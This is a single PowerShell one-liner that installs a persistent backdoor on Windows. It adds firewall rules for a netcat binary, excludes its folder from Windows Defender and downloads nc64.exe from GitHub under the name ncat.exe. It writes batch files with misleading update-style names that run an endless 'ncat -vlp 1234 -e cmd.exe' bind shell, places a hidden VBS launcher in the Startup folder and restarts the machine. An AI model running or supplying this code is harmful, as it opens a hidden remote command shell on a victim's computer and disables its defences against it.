New-NetFirewallRule -DisplayName "Test rules" -Direction Inbound -Program "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\ncat.exe" -RemoteAddress LocalSubnet -Action Allow ; New-NetFirewallRule -DisplayName "Test rules" -Direction Outbound -Program "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\ncat.exe" -RemoteAddress LocalSubnet -Action Allow ; Add-MpPreference -ExclusionPath "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\" ; [System.Net.WebClient]::new().DownloadFile("https://github.com/int0x33/nc.exe/raw/master/nc64.exe", "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\ncat.exe") ; echo "FOR /L %%N IN () DO @C:\Users\%username%\AppData\Roaming\Microsoft\Windows\update.bat" | out-file -encoding ASCII "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\ContribUpdateVarSysAmbivalent.bat" ; echo "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\ncat.exe -vlp 1234 -e cmd.exe" | out-file -encoding ASCII "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\update.bat" ; echo 'Set WshShell = CreateObject("WScript.Shell")' >> "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update-maker.vbs" ; echo 'WshShell.Run chr(34) & "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\ContribUpdateVarSysAmbivalent.bat" & Chr(34), 0' >> "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update-maker.vbs" ; echo "Set WshShell = Nothing" >> "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update-maker.vbs" ; Restart-Computer
